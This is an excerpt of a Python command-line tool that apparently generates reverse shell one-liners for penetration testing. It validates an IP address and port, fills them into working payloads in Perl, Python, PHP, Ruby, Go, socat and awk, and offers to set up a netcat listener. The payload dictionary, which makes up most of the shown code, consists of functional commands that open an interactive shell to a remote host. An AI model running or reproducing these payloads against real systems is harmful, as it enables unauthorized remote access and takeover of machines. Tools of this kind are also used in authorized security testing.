...
cyan = Template(Style.BRIGHT + Fore.CYAN + '$text' + Style.RESET_ALL)
...
class NetInfo:
    ...
    def validateIP(self, ip) -> bool:
        try:
            ...
            print(red.safe_substitute(text="\n[ERROR] Oops! The IP you entered [ {} ] is not valid, try again...".format(ip)))
            return False
    ...
    def validatePort(self, port) -> bool:
        try:
            if int(port) in range(1, 65535) and port.isdecimal():
                ...
                print(red.safe_substitute(text="\n[ERROR] Oops! The PORT you entered [ {} ] is either < 1 or > 65535! Try again...".format(port)))
                return False
        except ValueError:
            print(red.safe_substitute(text="\n[ERROR] Oops! The PORT you entered [ {} ]  contains string characters! Try again...".format(port)))
            return False
...
def generate_code(usr_choice, ip, port):
    shell_dict = {
        ...
        2: "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(
            ip, port),
        3: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'".format(
            ip, port),
        4: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'".format(
            ip, port),
        5: "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip, port),
        6: "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(
            ip, port),
        ...
        12: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%s:%s\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" % (
        ip, port),
        13: "socat tcp-connect:{}:{} exec:/bin/sh,pty,stderr,setsid,sigint,sane".format(ip, port),
        14: "awk 'BEGIN {s = \"/inet/tcp/0/%s/%s\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null" % (
        ip, port),
...
def menu():
    ...
    if tmp != 'None':
        ...
        try:
            if vpn_ip == 'y':
                print(blue.safe_substitute(text="[+] IP Set to: " + Style.RESET_ALL + tmp))
                ip = tmp
            else:
    ...
    while loop:
        try:
            ...
            if choice in range(1, 19):
                ...
                print(red.safe_substitute(text="\n[ERROR] Please enter integers between [1] --> [17]\n"))
        except ValueError:
            print(red.safe_substitute(text="\n[ERROR] Invalid value [ {} ] entered. Please enter integers between [1] --> [17]".format(choice)))
    ...
    if check_ip and check_port is True:
        ...
        nc = str(input(blue.safe_substitute(text="\n[+] Setup netcat listener? [ Y / N ]: "))).lower()
